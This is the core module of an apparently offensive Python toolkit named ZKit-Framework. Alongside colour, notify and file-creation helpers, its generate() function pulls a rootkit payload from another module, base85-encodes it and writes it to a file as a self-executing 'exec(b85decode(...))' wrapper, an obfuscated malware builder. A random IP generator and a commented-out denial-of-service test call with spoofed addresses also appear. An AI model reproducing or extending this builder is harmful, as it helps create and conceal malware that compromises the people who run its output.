"""
The Core Module of ZKit-Framework Contains : some useful methods like a custom create_file 

"""
# Python 2 is supported too
from __future__ import print_function,division,absolute_import
import os
class Color:
    def __init__(self):
        self.colors = {
                "black": "\033[30m",
                "red": "\033[31m",
                "green": "\033[32m",
                "yellow": "\033[33m",
                "blue": "\033[34m",
                "magenta": "\033[35m",
                "cyan": "\033[36m",
                "grey": "\033[37m",
                "reset": "\033[0m", 
                }
            
    def GetColor(self, colorname):
        import os     
        return self.colors.get(colorname)

    def GetAllColors(self):
        return tuple(self.colors.values())
def random_int(min_, max_):
    import random
    ints = list('0123456789')
    for i in range(min_, max_):
        num = int(''.join([random.choice(ints) for _ in range(len(str(max_)))]))
        if num <= max_ and num >= min_:
            return num


def random_ip():
    dot = '.'
    return str(random_int(12,220)) + dot + str(random_int(12,220)) + dot + str(random_int(12,220)) + dot + str(random_int(12,220))

def notify(status: str, message: str, ending="\n", flush=False):
    """
    notifies the user with given parameters . you can customize it very well

    Args:
        message (str): message shown for the user 
        status (str): status for event . all possibleties are "notify", "problem", "report"
        ending (str): used as value for print(message, end = ending)
        flush (bool): to flush the stream or not (default=False)
    """
    c = Color()
    if status == "report":

        first = c.GetColor("blue")   + " REPORT " + c.GetColor("reset")
    elif status == "notify":
        first = c.GetColor("green")  + " NOTIFY " + c.GetColor("reset")
    elif status == "problem":
        first = c.GetColor("red")    + "CRITICAL" + c.GetColor("reset")
    elif status == "question":
        first = c.GetColor("yellow") + "QUESTION" + c.GetColor("reset")
    else:
        raise ValueError("Unknow Status {}".format(status))
    if flush:
        print("\r[{}] {}".format(first, message), end=ending)
    else:
        print("[{}] {}".format(first, message), end=ending)


def create_file(path: str):
    """
    Creates A New file if a file is on the given path if exists asks for overwrite permission
    if yes clears file data then closes it if no asks for another file path

    Arguments:
        path (str) : Path to File to create if exists asks for overwriting permission

    Returns A Path if file created returns file path if not returns asked file path
    or returns none if got wrong answer at YES or NO overwrite permission ask
    """
    from time import sleep as Sleep
    notify("notify", "Creating File...", "")
    try:
        _ = open(path,  "x").close()
    except FileExistsError:
        Sleep(0.5)
        notify("problem", "Creating File...Failed \nFile Already Exists Confirm Overwrite : (N or Y) ", "", True)
        choice = str(input(""))
        Choice = choice.upper()
        if Choice == "Y":
            return path
        elif Choice == "N":
            file_name = str(input("Write Down File Name Here : "))
            file_name += ".pyw"

            return file_name
        else:
            notify("problem", "Invalid Input")
            return
    else:
        file_name = path
        notify("report", 
        "Creating File...Done ", "\n", True)
        return file_name


def generate(payload_type):
    from base64 import b85encode as be, b85decode as bd
    from core.rootkit import get_rootkit
    if payload_type == "rootkit":
        payload, path = get_rootkit()
    notify("notify", "Opening File To Write Data On It...", "")
    try:
        f = open(path, "w+")
    except:
        notify("problem", "Opening File To Write Data On It...Failed \n Cannnot Open File", "\n",True)
        return
    else:
        notify("report", 
        "Opening File To Write Data On It...Done", "\n",True)
    notify("notify", "Encrypting Data Before Writing On File...", "")
    payload = be(payload.encode("UTF-8")).decode("UTF-8")
    notify("report", 
    "Encrypting Data Before Writing On File...Done", "\n", True)
    payload = 'from base64 import b85decode\nvalue = """' + payload + '"""\nexec(b85decode(value))'
    notify("notify", "Writing Data On File...", "")
    try:
        f.write(payload)
    except PermissionError:
        notify("problem", "Writing Data On File...Failed \nSomething Went Wrong . Looks Like "
              "You Dont Have Access To The File." "\n", True)
    except:
        notify("problem", "Writing Data On File...Failed \nSomething Went Wrong . Is Another Process "
              "Using It ? ", "\n", True)
        notify("problem", "Couldnt Write Data On File Closing File...", "")
        f.close()
        print("Done")
    else:
        notify("report", 
        "Writing Data On File...Done", "\n", True)
        notify("report", 
        "Operation was successful")

if __name__ == "__main__":
    print("Dont Run This File")
# Used For Test
#dos_ss("192.168.1.1", "127.0.0.1", 110 , 80 , 1, "Test")
